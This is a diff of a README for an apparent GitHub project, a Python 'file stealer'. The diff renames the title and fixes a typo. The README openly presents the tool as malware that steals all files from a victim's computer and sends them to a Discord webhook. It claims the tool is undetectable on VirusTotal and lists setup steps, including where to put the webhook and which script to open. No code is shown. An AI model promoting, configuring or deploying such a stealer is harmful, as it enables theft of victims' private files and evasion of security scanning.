@@ -1,4 +1,4 @@
-# Python-Malware-File-Stealer
+# Python-File-Stealer
 This is a File Stealer written in Python. As of the 07/05/23, this is undetectable in virus total. This is malware designed as powerful file stealer to steal all the files from a victims computer and then forward the files to a discord WebHook.
 
 ## Functionality:
@@ -18,7 +18,7 @@ All you need to do to have this program work is place your discord webhook in th
 ## Necessary Things: 
 * You will need python installed to use this. If you dont't have it installed look [here](https://www.python.org/downloads/windows/)
 
-## How to install and use the porgram:
+## How to install and use the program:
 1. Clone the github repository
 2. Unzip the downloded zip file to a location of your choice
 3. Go to the place of which you unziped the zip file and open the stealer8.py file in a python IDE of your choice. 
